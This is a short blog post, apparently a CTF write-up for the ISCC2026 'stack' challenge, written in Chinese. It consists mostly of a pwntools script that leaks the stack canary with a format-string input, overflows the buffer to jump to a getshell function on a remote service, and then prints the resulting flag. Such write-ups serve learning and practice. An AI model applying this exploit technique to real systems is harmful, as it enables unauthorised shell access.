+++
title = "stack"
date = "2026-05-06"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++
一个简单的canary绕过
利用格式化字符串把canary拿出来
```python
from pwn import *  
  
context(os="linux", arch="i386", log_level="debug")  
  
elf = ELF("./attachment-5")  
  
io = remote('39.96.193.120',10018)  
  
getshell = elf.symbols["getshell"]  
log.success(f"getshell = {hex(getshell)}")  
  
io.recvuntil(b"Hello Hacker!\n")  
  
# 第一次输入：泄露 canary
io.send(b"%31$p.END\x00")  
  
leak = io.recvuntil(b".END", drop=True)  
canary = int(leak, 16)  
  
log.success(f"canary = {hex(canary)}")  
  
# 第二次输入：溢出并 ret2getshell
payload = b"A" * 0x64  
payload += p32(canary)  
payload += b"B" * 0xc  
payload += p32(getshell)  
  
io.send(payload)  
  
io.interactive()
```


```
ISCC{b35011bd-571b-4561-8382-b78aa1530853}
```
## 附件下载

- [attachment-5](attachment-5)

